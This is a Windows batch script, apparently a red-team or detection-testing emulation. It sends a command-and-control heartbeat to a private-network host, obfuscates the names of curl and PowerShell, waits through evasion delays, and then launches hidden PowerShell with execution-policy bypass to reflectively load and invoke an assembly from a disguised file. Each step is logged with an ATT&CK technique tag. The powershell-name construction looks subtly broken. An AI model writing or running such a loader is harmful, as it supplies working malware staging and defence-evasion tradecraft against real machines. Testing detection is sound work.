@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals)
SET txisnba=%APPDATA%\8482\289c1cb9
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8482-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=visio.txt
SET dvhhyc=8482

REM Random variables for obfuscated components
SET mklsdf=macula-simulations.log
SET ykngrt=%APPDATA%\!rrocubc!
SET logvar=%ykngrt%\!mklsdf!

REM Initial delay 40s
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_start=initial_delay_40s>> "!logvar!" 2>nul
timeout /t 40 /nobreak >nul

REM Build curl.exe character by character
SET q1=c
SET q2=u
SET q3=r
SET q4=l
SET q5=.
SET q6=e
SET q7=x
SET q8=e
SET curlcmd=%q1%%q2%%q3%%q4%%q5%%q6%%q7%%q8%

REM C2 Heartbeat (first task)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start>> "!logvar!" 2>nul
curl -k -s -o nul "!keghkgto!"
SET hbresult=1
IF !ERRORLEVEL! NEQ 0 SET hbresult=0
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_complete=errorlevel_!ERRORLEVEL!>> "!logvar!" 2>nul

REM Delay between operations 12s
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_before_chdir=12s>> "!logvar!" 2>nul
ping -n 12 127.0.0.1 >nul

REM Build powershell.exe using character codes
SET psresult=
FOR /F %%a IN ('echo 112 111 119 101 114 115 104 101 108 108 46 101 120 101') DO (
    CMD /C EXIT %%a
    SET psresult=!psresult!!=ExitCodeChar!
)

REM Change directory
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_start=!txisnba!>> "!logvar!" 2>nul
cd /d "!txisnba!"
SET cdresult=1
IF !ERRORLEVEL! NEQ 0 SET cdresult=0
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_complete=errorlevel_!ERRORLEVEL!>> "!logvar!" 2>nul

REM Random delay 10-29s
SET /A rnddelay=!RANDOM! %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_start=!rnddelay!s>> "!logvar!" 2>nul
CHOICE /C Y /N /D Y /T !rnddelay! >nul

REM Build PowerShell command with obfuscated components
SET a1=[Reflection.Assembly]::Load([IO.File]::ReadAllBytes('
SET a2=')).EntryPoint.Invoke($null, @(,[string[]]@()))
SET fullcmd=& { !a1!!xzanpex!!a2! }

REM Execute DLL via PowerShell
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: powershell_dll_load_start=!xzanpex!>> "!logvar!" 2>nul
!psresult! -nop -w hidden -ep bypass -Command "!fullcmd!"
SET psdllresult=1
SET errdetail=
IF !ERRORLEVEL! NEQ 0 (
    SET psdllresult=0
    SET errdetail=assembly_load_failed
)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: powershell_dll_load_complete=errorlevel_!ERRORLEVEL!>> "!logvar!" 2>nul

REM TTP logging for T1218 (Signed Binary Proxy Execution)
FOR /F "tokens=2 delims==." %%i IN ('wmic os get localdatetime /value') DO SET tstamp=%%i
SET formatted=!tstamp:~0,4!-!tstamp:~4,2!-!tstamp:~6,2! !tstamp:~8,2!:!tstamp:~10,2!:!tstamp:~12,2!.!tstamp:~15,3!
echo [!formatted!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!psdllresult!:!errdetail!>> "!logvar!" 2>nul

REM Final delay 15s
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_start=15s>> "!logvar!" 2>nul
timeout /t 15 /nobreak >nul

ENDLOCAL